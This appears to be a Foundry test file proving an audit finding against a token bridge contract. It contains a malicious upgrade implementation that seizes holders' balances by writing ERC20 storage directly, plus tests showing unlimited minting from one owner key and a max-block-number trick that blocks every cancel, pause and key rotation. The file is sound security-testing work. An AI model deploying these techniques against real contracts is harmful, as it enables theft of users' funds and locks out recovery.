// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.24;

import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {BridgeTest} from "./utils/BridgeTest.sol";
import {MerkleHelper} from "./utils/MerkleHelper.sol";
import {HypersnapBridge} from "../src/HypersnapBridge.sol";

/// Malicious UUPS-compatible implementation. `proposeUpgrade` only checks
/// `proxiableUUID()`, which UUPSUpgradeable provides. Once installed it can
/// move any holder's balance: ERC20Upgradeable keeps balances in the
/// ERC-7201 namespaced slot, so the evil impl writes that slot directly.
contract EvilImpl is UUPSUpgradeable {
    // keccak256(abi.encode(uint256(keccak256("openzeppelin.storage.ERC20")) - 1)) & ~bytes32(uint256(0xff))
    bytes32 private constant ERC20_LOC =
        0x52c63247e1f47db19d5ce0460030c497f067ca4cebf71ba98eeadabe20bace00;

    function version() external pure returns (uint256) {
        return 666;
    }

    /// Move `amount` from `from` to `to` with no approval (balances mapping is slot 0 of the namespace).
    function seize(address from, address to, uint256 amount) external {
        bytes32 fromSlot = keccak256(abi.encode(from, ERC20_LOC));
        bytes32 toSlot = keccak256(abi.encode(to, ERC20_LOC));
        uint256 fb;
        uint256 tb;
        assembly {
            fb := sload(fromSlot)
            tb := sload(toSlot)
        }
        fb -= amount;
        tb += amount;
        assembly {
            sstore(fromSlot, fb)
            sstore(toSlot, tb)
        }
    }

    function balanceOf(address a) external view returns (uint256 b) {
        bytes32 slot = keccak256(abi.encode(a, ERC20_LOC));
        assembly {
            b := sload(slot)
        }
    }

    function _authorizeUpgrade(address) internal override {}
}

contract F005V1OwnerKeyTest is BridgeTest {
    uint64 internal constant MAX = type(uint64).max;
    address internal relayer = address(0xBEEF);
    address internal holder = address(0xA0A0);

    // ---------------------------------------------------------------------
    // helpers
    // ---------------------------------------------------------------------

    /// Honest history: one genuine root at block 100 paying `holder` 1_000e6.
    function _honestHistory() internal {
        bytes32[] memory leaves = new bytes32[](1);
        leaves[0] = _lockLeafEvm(keccak256("honest-lock"), uint32(block.chainid), holder, 1_000e6);
        bytes32 root = MerkleHelper.root(leaves);
        bridge.claim(
            100,
            root,
            _signRootUpdate(100, root, OWNER_PK),
            keccak256("honest-lock"),
            holder,
            1_000e6,
            uint32(block.chainid),
            new bytes32[](0)
        );
        assertEq(bridge.balanceOf(holder), 1_000e6);
    }

    function _deployProxy(address owner) internal returns (HypersnapBridge) {
        HypersnapBridge i = new HypersnapBridge();
        return HypersnapBridge(
            address(new ERC1967Proxy(address(i), abi.encodeCall(HypersnapBridge.initialize, (owner, "Hypersnap", "SNAP"))))
        );
    }

    // ---------------------------------------------------------------------
    // Claim 1: one owner signature mints any amount, instantly, no cap
    // ---------------------------------------------------------------------

    function test_F005_singleSig_mintsUnbounded_noDelay() public {
        _honestHistory();
        uint256 supplyBefore = bridge.totalSupply();

        bytes32 fakeLock = keccak256("fake-lock");
        uint256 amount = 1e30; // 1e24 SNAP at 6 decimals
        bytes32[] memory leaves = new bytes32[](1);
        leaves[0] = _lockLeafEvm(fakeLock, uint32(block.chainid), attackerEOA, amount);
        bytes32 root = MerkleHelper.root(leaves);
        bytes memory sig = _signRootUpdate(101, root, OWNER_PK); // the one signature

        uint256 t0 = block.timestamp;
        vm.prank(relayer);
        bridge.claim(101, root, sig, fakeLock, attackerEOA, amount, uint32(block.chainid), new bytes32[](0));

        assertEq(block.timestamp, t0, "same block, no delay");
        assertEq(bridge.balanceOf(attackerEOA), amount);
        assertEq(bridge.totalSupply(), supplyBefore + amount);
    }

    /// The root signature is universal: one root with a leaf per chain mints on both deployments.
    function test_F005_singleRootSig_mintsOnTwoChains() public {
        uint32 chainA = 1;
        uint32 chainB = 8453;
        vm.chainId(chainA);
        HypersnapBridge a = _deployProxy(ownerEOA);
        vm.chainId(chainB);
        HypersnapBridge b = _deployProxy(ownerEOA);

        bytes32[] memory leaves = new bytes32[](2);
        leaves[0] = _lockLeafEvm(keccak256("fake-A"), chainA, attackerEOA, 1e30);
        leaves[1] = _lockLeafEvm(keccak256("fake-B"), chainB, attackerEOA, 1e30);
        bytes32 root = MerkleHelper.root(leaves);
        bytes memory sig = _signRootUpdate(7, root, OWNER_PK);

        vm.chainId(chainA);
        a.claim(7, root, sig, keccak256("fake-A"), attackerEOA, 1e30, chainA, MerkleHelper.proofFor(leaves, 0));
        vm.chainId(chainB);
        b.claim(7, root, sig, keccak256("fake-B"), attackerEOA, 1e30, chainB, MerkleHelper.proofFor(leaves, 1));

        assertEq(a.balanceOf(attackerEOA), 1e30);
        assertEq(b.balanceOf(attackerEOA), 1e30);
    }

    // ---------------------------------------------------------------------
    // Claim 2: proposeUpgrade at 2^64-1 makes the upgrade unstoppable
    // ---------------------------------------------------------------------

    function test_F005_maxBlockPoison_upgradeUnstoppable_andSeizesHolders() public {
        _honestHistory();
        EvilImpl evil = new EvilImpl();

        // Compromised key: one signature.
        bridge.proposeUpgrade(MAX, address(evil), _signUpgrade(MAX, address(evil), OWNER_PK));
        assertEq(bridge.latestBlock(), MAX);

        // Honest operators react at once with the same key (they still have it)
        // and with a freshly generated replacement key. Every defence reverts.
        bytes memory rotAuth = _signOwnerUpdate(MAX, newOwnerEOA, OWNER_PK);
        bytes memory rotAcc = _signOwnerAcceptance(newOwnerEOA, NEW_OWNER_PK);
        vm.expectRevert(abi.encodeWithSelector(HypersnapBridge.StaleBlock.selector, MAX, MAX));
        bridge.rotateOwner(MAX, newOwnerEOA, rotAuth, rotAcc);

        bytes memory cancelSig = _signUpgradeCancel(MAX, address(evil), OWNER_PK);
        vm.expectRevert(abi.encodeWithSelector(HypersnapBridge.StaleBlock.selector, MAX, MAX));
        bridge.cancelUpgrade(MAX, address(evil), cancelSig);

        bytes memory pauseSig = _signPause(MAX, OWNER_PK);
        vm.expectRevert(abi.encodeWithSelector(HypersnapBridge.StaleBlock.selector, MAX, MAX));
        bridge.pause(MAX, pauseSig);

        // 48h later anyone executes.
        vm.warp(block.timestamp + bridge.UPGRADE_DELAY());
        vm.prank(relayer);
        bridge.executeUpgrade();

        EvilImpl pwned = EvilImpl(address(bridge));
        assertEq(pwned.version(), 666);
        // Evil impl takes an honest holder's balance without approval.
        pwned.seize(holder, attackerEOA, 1_000e6);
        assertEq(pwned.balanceOf(holder), 0);
        assertEq(pwned.balanceOf(attackerEOA), 1_000e6);
    }

    /// A pause that lands BEFORE the poison only delays: propose is not pause-gated,
    /// and once the 72h pause expires nobody can re-pause or cancel.
    function test_F005_prePoisonPause_onlyDelaysExecution() public {
        bridge.pause(50, _signPause(50, OWNER_PK)); // honest defensive pause first
        EvilImpl evil = new EvilImpl();
        bridge.proposeUpgrade(MAX, address(evil), _signUpgrade(MAX, address(evil), OWNER_PK));

        vm.warp(block.timestamp + bridge.UPGRADE_DELAY());
        vm.expectRevert(); // BridgePaused
        bridge.executeUpgrade();

        bytes memory p2 = _signPause(MAX, OWNER_PK);
        vm.expectRevert(abi.encodeWithSelector(HypersnapBridge.StaleBlock.selector, MAX, MAX));
        bridge.pause(MAX, p2);

        vm.warp(bridge.pauseExpiry());
        bridge.executeUpgrade();
        assertEq(EvilImpl(address(bridge)).version(), 666);
    }

    // ---------------------------------------------------------------------
    // Claim 3: an honest root at 2^64-1 freezes the bridge for good
    // ---------------------------------------------------------------------

    function test_F005_honestRootAtMax_freezesAllGovernance() public {
        _honestHistory();
        // Operator mistake: a root signed at u64::MAX (e.g. a -1 / MAX sentinel).
        bytes32[] memory leaves = new bytes32[](1);
        leaves[0] = _lockLeafEvm(keccak256("lock-2"), uint32(block.chainid), holder, 5e6);
        bytes32 root = MerkleHelper.root(leaves);
        bridge.claim(MAX, root, _signRootUpdate(MAX, root, OWNER_PK), keccak256("lock-2"), holder, 5e6, uint32(block.chainid), new bytes32[](0));

        // A later genuine root can never be installed.
        bytes32[] memory l3 = new bytes32[](1);
        l3[0] = _lockLeafEvm(keccak256("lock-3"), uint32(block.chainid), holder, 7e6);
        bytes32 root3 = MerkleHelper.root(l3);
        bytes memory sig3 = _signRootUpdate(MAX, root3, OWNER_PK);
        vm.expectRevert(HypersnapBridge.RootMismatch.selector);
        bridge.claim(MAX, root3, sig3, keccak256("lock-3"), holder, 7e6, uint32(block.chainid), new bytes32[](0));

        // No governance action is possible any more.
        EvilImpl fixImpl = new EvilImpl();
        bytes memory s1 = _signUpgrade(MAX, address(fixImpl), OWNER_PK);
        vm.expectRevert(abi.encodeWithSelector(HypersnapBridge.StaleBlock.selector, MAX, MAX));
        bridge.proposeUpgrade(MAX, address(fixImpl), s1);
        bytes memory s2 = _signPause(MAX, OWNER_PK);
        vm.expectRevert(abi.encodeWithSelector(HypersnapBridge.StaleBlock.selector, MAX, MAX));
        bridge.pause(MAX, s2);
        bytes memory s3a = _signOwnerUpdate(MAX, newOwnerEOA, OWNER_PK);
        bytes memory s3b = _signOwnerAcceptance(newOwnerEOA, NEW_OWNER_PK);
        vm.expectRevert(abi.encodeWithSelector(HypersnapBridge.StaleBlock.selector, MAX, MAX));
        bridge.rotateOwner(MAX, newOwnerEOA, s3a, s3b);

        // Existing tokens still move and burn (the freeze is of roots/governance, not balances).
        vm.prank(holder);
        bridge.burn(1e6, bytes32(uint256(1)));
        assertEq(bridge.balanceOf(holder), 1_004e6);
    }

    // ---------------------------------------------------------------------
    // Controls
    // ---------------------------------------------------------------------

    /// Non-owner key cannot advance the root.
    function test_control_nonOwnerRootRejected() public {
        bytes32[] memory leaves = new bytes32[](1);
        leaves[0] = _lockLeafEvm(keccak256("x"), uint32(block.chainid), attackerEOA, 1e30);
        bytes32 root = MerkleHelper.root(leaves);
        bytes memory sig = _signRootUpdate(1, root, ATTACKER_PK);
        vm.expectRevert(HypersnapBridge.BadOwnerSignature.selector);
        bridge.claim(1, root, sig, keccak256("x"), attackerEOA, 1e30, uint32(block.chainid), new bytes32[](0));
    }

    /// Documented recovery works when the malicious proposal uses a normal block number.
    function test_control_recoveryWorksWithoutPoison() public {
        EvilImpl evil = new EvilImpl();
        bridge.proposeUpgrade(10, address(evil), _signUpgrade(10, address(evil), OWNER_PK));
        bridge.rotateOwner(11, newOwnerEOA, _signOwnerUpdate(11, newOwnerEOA, OWNER_PK), _signOwnerAcceptance(newOwnerEOA, NEW_OWNER_PK));
        bridge.cancelUpgrade(12, address(evil), _signUpgradeCancel(12, address(evil), NEW_OWNER_PK));
        assertEq(bridge.pendingImplementation(), address(0));
        vm.warp(block.timestamp + bridge.UPGRADE_DELAY());
        vm.expectRevert(HypersnapBridge.NoPendingUpgrade.selector);
        bridge.executeUpgrade();
    }

    /// Exactly MAX is the poison: at MAX-1 the defender still has one slot (MAX) to cancel.
    function test_control_maxMinusOne_stillCancellable() public {
        EvilImpl evil = new EvilImpl();
        bridge.proposeUpgrade(MAX - 1, address(evil), _signUpgrade(MAX - 1, address(evil), OWNER_PK));
        bridge.cancelUpgrade(MAX, address(evil), _signUpgradeCancel(MAX, address(evil), OWNER_PK));
        assertEq(bridge.pendingImplementation(), address(0));
    }

    /// A wrong-unit jump that is far below MAX (ms timestamp) is recoverable:
    /// the owner keeps signing above it.
    function test_control_msTimestampJump_recoverable() public {
        uint64 ms = 1_762_214_400_000; // 2025-11-04 in ms
        bridge.pause(ms, _signPause(ms, OWNER_PK));
        vm.warp(block.timestamp + bridge.PAUSE_DURATION());
        EvilImpl impl2 = new EvilImpl();
        bridge.proposeUpgrade(ms + 1, address(impl2), _signUpgrade(ms + 1, address(impl2), OWNER_PK));
        bridge.cancelUpgrade(ms + 2, address(impl2), _signUpgradeCancel(ms + 2, address(impl2), OWNER_PK));
        assertEq(bridge.latestBlock(), ms + 2);
    }

    /// executeUpgrade before the delay reverts (the 48h timer itself works).
    function test_control_executeBeforeDelayReverts() public {
        EvilImpl evil = new EvilImpl();
        bridge.proposeUpgrade(MAX, address(evil), _signUpgrade(MAX, address(evil), OWNER_PK));
        vm.warp(block.timestamp + bridge.UPGRADE_DELAY() - 1);
        vm.expectRevert();
        bridge.executeUpgrade();
    }
}
